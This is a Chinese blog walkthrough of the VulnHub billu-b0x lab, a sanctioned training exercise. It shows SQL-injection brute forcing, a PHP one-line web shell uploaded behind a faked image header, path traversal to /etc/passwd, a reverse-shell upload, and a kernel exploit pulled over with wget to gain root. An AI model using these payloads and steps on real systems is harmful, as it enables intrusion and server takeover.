@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="靶机：https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;billu-b0x,188&#x2F; 难度：中 目标：获取root权限 备注：导入靶机时保留原始MAC地址不变（包含所有网卡的MAC地址）">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulnHub-11-billu-b0x">
+<meta property="og:url" content="http://byesec.com/posts/db530782.html">
+<meta property="og:site_name" content="patrik&#39;s blog">
+<meta property="og:description" content="靶机：https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;billu-b0x,188&#x2F; 难度：中 目标：获取root权限 备注：导入靶机时保留原始MAC地址不变（包含所有网卡的MAC地址）">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220401110030660.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220401110123984.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220401110158074.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220401111000636.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220401111103575.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706161817115.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706162606247.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706163253920.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706163336960.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706163630006.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706163944385.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706164441029.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706164535988.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706164643296.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706165316773.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706165329493.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706165754115.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706165802442.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706170040234.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706170433124.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706170508716.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706170615225.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706170830740.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706171624866.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706172036258.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706172648635.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706172752334.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706172945773.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706173401910.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706173459689.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706174001408.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706174035924.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706174153940.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706174245307.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706174448747.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706174527217.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706174646448.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706175003380.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706175131336.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706175713563.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706175921378.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706180153436.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706180338485.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706171624866.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706180957428.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706181243209.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706181302715.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706181412320.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706181445598.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706181750787.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706182127346.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706183914586.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706184051272.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220707091928522.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706184902945.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706185112022.png">
+<meta property="og:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706185439437.png">
+<meta property="article:published_time" content="2022-08-15T02:10:55.000Z">
+<meta property="article:modified_time" content="2022-09-14T01:48:51.953Z">
+<meta property="article:author" content="patrik">
+<meta property="article:tag" content="靶机🎯">
+<meta property="article:tag" content="VulnHub🎯">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220401110030660.png">
+    
+    
+      
+        
+          
+            <link rel="shortcut icon" href="https://www.gravatar.com/avatar/1c0ccb80f18de6871d3fd37b97cd3594?s=48">
+          
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/logo-1.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/logo-1.png">
+        
+      
+    
+    <!-- title -->
+    <title>VulnHub-11-billu-b0x</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="patrik&#39;s blog" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/posts/66759de7.html"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/posts/d2a7ad22.html"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://byesec.com/posts/db530782.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://byesec.com/posts/db530782.html&text=VulnHub-11-billu-b0x"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://byesec.com/posts/db530782.html&title=VulnHub-11-billu-b0x"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://byesec.com/posts/db530782.html&is_video=false&description=VulnHub-11-billu-b0x"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VulnHub-11-billu-b0x&body=Check out this article: http://byesec.com/posts/db530782.html"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://byesec.com/posts/db530782.html&title=VulnHub-11-billu-b0x"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://byesec.com/posts/db530782.html&title=VulnHub-11-billu-b0x"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://byesec.com/posts/db530782.html&title=VulnHub-11-billu-b0x"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://byesec.com/posts/db530782.html&title=VulnHub-11-billu-b0x"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://byesec.com/posts/db530782.html&name=VulnHub-11-billu-b0x&description=&lt;blockquote&gt;
+&lt;p&gt;靶机：&lt;a href=&#34;https://www.vulnhub.com/entry/billu-b0x,188/&#34;&gt;https://www.vulnhub.com/entry/billu-b0x,188/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;难度：中&lt;/p&gt;
+&lt;p&gt;目标：获取root权限&lt;/p&gt;
+&lt;p&gt;备注：导入靶机时保留原始MAC地址不变（包含所有网卡的MAC地址）&lt;/p&gt;
+&lt;/blockquote&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://byesec.com/posts/db530782.html&t=VulnHub-11-billu-b0x"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-number">1.</span> <span class="toc-text">方法一</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">1.1.</span> <span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.3.</span> <span class="toc-text">服务探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE80%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.4.</span> <span class="toc-text">访问80端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.5.</span> <span class="toc-text">SQL注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.6.</span> <span class="toc-text">文件上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-number">1.7.</span> <span class="toc-text">目录扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.8.</span> <span class="toc-text">文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83"><span class="toc-number">1.9.</span> <span class="toc-text">内核提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toc-number">2.</span> <span class="toc-text">方法二</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">2.1.</span> <span class="toc-text">任意文件读取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">2.2.</span> <span class="toc-text">代码审计</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">2.3.</span> <span class="toc-text">配置文件读取</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        VulnHub-11-billu-b0x
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">干 脆 面</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-08-15T02:10:55.000Z" class="dt-published" itemprop="datePublished">2022-08-15</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%AE%89%E5%85%A8%F0%9F%94%90/">安全🔐</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/VulnHub%F0%9F%8E%AF/" rel="tag">VulnHub🎯</a>, <a class="p-category" href="/tags/%E9%9D%B6%E6%9C%BA%F0%9F%8E%AF/" rel="tag">靶机🎯</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <blockquote>
+<p>靶机：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/billu-b0x,188/">https://www.vulnhub.com/entry/billu-b0x,188/</a></p>
+<p>难度：中</p>
+<p>目标：获取root权限</p>
+<p>备注：导入靶机时保留原始MAC地址不变（包含所有网卡的MAC地址）</p>
+</blockquote>
+<span id="more"></span>
+
+<h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan -l</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220401110030660.png" alt="image-20220401110030660"></p>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p- 192.168.1.108</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220401110123984.png" alt="image-20220401110123984"></p>
+<h3 id="服务探测"><a href="#服务探测" class="headerlink" title="服务探测"></a>服务探测</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p22,80 -sV -sC 192.168.1.108</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220401110158074.png" alt="image-20220401110158074"></p>
+<h3 id="访问80端口"><a href="#访问80端口" class="headerlink" title="访问80端口"></a>访问80端口</h3><p>访问<a target="_blank" rel="noopener" href="http://192.168.1.108/">http://192.168.1.108:80</a></p>
+<p>页面提示使用SQL注入</p>
+<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220401111000636.png" alt="image-20220401111000636"></p>
+<p>进行了简单的手动注入测试，并没有在页面发现有用的回显信息</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220401111103575.png" alt="image-20220401111103575"></p>
+<p>burp抓包放到sqlmap跑一下（并未能跑出想要的结果）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r 1.txt --batch --random-agent --level=3</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706161817115.png" alt="image-20220706161817115"></p>
+<p>把数据包发送至Intruder模块尝试爆破</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706162606247.png" alt="image-20220706162606247"></p>
+<p>选取针对SQL注入的字典**&#x2F;SecLists-2021.4&#x2F;Fuzzing&#x2F;SQLi&#x2F;Generic-SQLi.txt<strong>和</strong>Burp专业版自带的SQL注入字典**</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706163253920.png" alt="image-20220706163253920"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706163336960.png" alt="image-20220706163336960"></p>
+<p>再结合之前登录错误的提示Try again进行筛选配置</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706163630006.png" alt="image-20220706163630006"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706163944385.png" alt="image-20220706163944385"></p>
+<p>筛选后看到页面响应为You are allowed</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706164441029.png" alt="image-20220706164441029"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706164535988.png" alt="image-20220706164535988"></p>
+<p>将请求内容填入登陆窗口成功登陆</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706164643296.png" alt="image-20220706164643296"></p>
+<p>发现页面有查看用户和添加用户两个功能</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706165316773.png" alt="image-20220706165316773"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706165329493.png" alt="image-20220706165329493"></p>
+<p>添加用户这里存在上传点，看是否存在文件上传漏洞</p>
+<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>创建一句话木马a.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706165754115.png" alt="image-20220706165754115"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706165802442.png" alt="image-20220706165802442"></p>
+<p>提示只能上传png,jpg格式</p>
+<p>看服务端是否只是根据扩展名来检验</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706170040234.png" alt="image-20220706170040234"></p>
+<p>尝试修改文件格式、文件类型和文件头后成功上传</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706170433124.png" alt="image-20220706170433124"></p>
+<p>重新查看用户列表</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706170508716.png" alt="image-20220706170508716"></p>
+<p>尝试访问图片发现确实存在该文件</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706170615225.png" alt="image-20220706170615225"></p>
+<p>访问&#x2F;uploaded_images目录</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706170830740.png" alt="image-20220706170830740"></p>
+<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.1.108</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706171624866.png" alt="image-20220706171624866"></p>
+<p>访问add.php和add发现和刚才的添加用户界面一致，猜测在添加用户界面可能是调用了这俩个页面</p>
+<p>抓取访问添加用户界面的请求数据包</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706172036258.png" alt="image-20220706172036258"></p>
+<p>猜测load参数的值即为请求页面，是否存在本地的文件包含呢？</p>
+<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>进行简单的测试</p>
+<p>load参数正常请求add 页面正常返回</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706172648635.png" alt="image-20220706172648635"></p>
+<p>load参数请求adddddd 页面返回为空</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706172752334.png" alt="image-20220706172752334"></p>
+<p>load参数请求..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd 成功访问到&#x2F;etc&#x2F;passwd文件</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706172945773.png" alt="image-20220706172945773"></p>
+<p>此时再尝试能否结合文件包含漏洞访问之前上传的一句话木马(路径&#x2F;uploaded_images&#x2F;a.png)</p>
+<p>load参数请求<a target="_blank" rel="noopener" href="http://192.168.1.108/uploaded_images/a.png?cmd=id">http://192.168.1.108/uploaded_images/a.png?cmd=id</a> 返回为空</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706173401910.png" alt="image-20220706173401910"></p>
+<p>load参数请求uploaded_images&#x2F;a.png?cmd&#x3D;id 返回依然为空</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706173459689.png" alt="image-20220706173459689"></p>
+<p>思考：是否服务端不能解析刚才上传的一句话木马呢？</p>
+<p>尝试：重新上传反弹shell的图片木马（&#x2F;usr&#x2F;share&#x2F;webshells&#x2F;php&#x2F;php-reverse-shell.php）</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706174001408.png" alt="image-20220706174001408"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706174035924.png" alt="image-20220706174035924"></p>
+<p>仍然添加图片头部</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706174153940.png" alt="image-20220706174153940"></p>
+<p>以及修改配置为kali的ip和监听端口</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706174245307.png" alt="image-20220706174245307"></p>
+<p>Forward成功上传</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706174448747.png" alt="image-20220706174448747"></p>
+<p>路径下也确实存在了b.png</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706174527217.png" alt="image-20220706174527217"></p>
+<p>本地监听4444端口</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706174646448.png" alt="image-20220706174646448"></p>
+<p>Burp内重新提交 load参数请求uploaded_images&#x2F;b.png 的数据包 看服务端能否成功解析</p>
+<p>成功反弹shell并优化 用户为普通权限</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706175003380.png" alt="image-20220706175003380"></p>
+<h3 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706175131336.png" alt="image-20220706175131336"></p>
+<p>有印象之前这个内核版本可以直接提权 使用kali搜索该内核版本提权利用脚本</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706175713563.png" alt="image-20220706175713563"></p>
+<p>exp.c目录下启动http服务再在目标上利用wget获取exp.c</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706175921378.png" alt="image-20220706175921378"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706180153436.png" alt="image-20220706180153436"></p>
+<p>gcc编译exp.c为二进制文件并赋予其执行权限</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706180338485.png" alt="image-20220706180338485"></p>
+<p>提权成功</p>
